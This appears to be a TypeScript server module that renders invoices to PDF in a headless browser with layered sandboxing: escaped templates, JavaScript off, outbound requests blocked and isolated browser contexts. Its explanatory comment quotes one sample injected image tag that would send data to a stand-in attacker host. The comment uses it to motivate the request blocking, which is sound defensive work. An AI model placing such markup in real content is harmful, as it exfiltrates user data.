import 'server-only';

import type { InvoiceDetailDTO } from '@/server/db/types';

import { getBrowser } from './browser';
import { renderInvoiceHtml } from './invoice-template';

/**
 * Turn an invoice into a PDF.
 *
 * Defence in depth around a headless browser that renders user-derived content:
 *
 *  1. The HTML is built by `renderInvoiceHtml`, where every user value passes
 *     through an escaping tagged template. Markup cannot be smuggled in.
 *
 *  2. JavaScript is disabled on the page (`setJavaScriptEnabled(false)`). Even
 *     if an escaping bug ever let a `<script>` through, there is no engine to
 *     run it, and no `onerror=` handler can fire.
 *
 *  3. Every request is blocked except the initial document. The template is
 *     self-contained, so a legitimate render needs no network at all; this
 *     turns any injected `<img src=http://attacker/?c=...>` into a dead link
 *     and closes the SSRF path into internal services that a rendering box
 *     would otherwise expose.
 *
 *  4. The page runs in a fresh incognito browser context, so nothing —
 *     cookies, storage, cache — carries between two users' renders.
 *
 *  5. Rendering is bounded by a timeout and the page is always closed, so one
 *     pathological invoice cannot pin a browser tab open.
 */

const RENDER_TIMEOUT_MS = 20_000;

export interface PdfRenderResult {
  pdf: Buffer;
  html: string;
}

export async function renderInvoicePdf(
  invoice: InvoiceDetailDTO,
): Promise<PdfRenderResult> {
  const documentHtml = renderInvoiceHtml(invoice);

  const browser = await getBrowser();
  const context = await browser.createBrowserContext();

  try {
    const page = await context.newPage();

    // (2) No script execution in the rendering page.
    await page.setJavaScriptEnabled(false);
    page.setDefaultTimeout(RENDER_TIMEOUT_MS);

    // (3) Allow only the synthetic document itself; drop everything else.
    await page.setRequestInterception(true);
    page.on('request', (request) => {
      if (request.isNavigationRequest() && request.frame() === page.mainFrame()) {
        void request.continue();
        return;
      }
      void request.abort();
    });

    await page.setContent(documentHtml, {
      waitUntil: 'load',
      timeout: RENDER_TIMEOUT_MS,
    });

    // Fonts must be ready or CJK glyphs can rasterise as fallback boxes.
    await page.evaluateHandle('document.fonts.ready');

    const pdf = await page.pdf({
      format: 'A4',
      printBackground: true,
      preferCSSPageSize: true,
      timeout: RENDER_TIMEOUT_MS,
    });

    return { pdf: Buffer.from(pdf), html: documentHtml };
  } finally {
    // (4)/(5) Disposing the context closes its pages even on failure.
    await context.close().catch(() => {
      // The browser may already have gone away; nothing further to do.
    });
  }
}
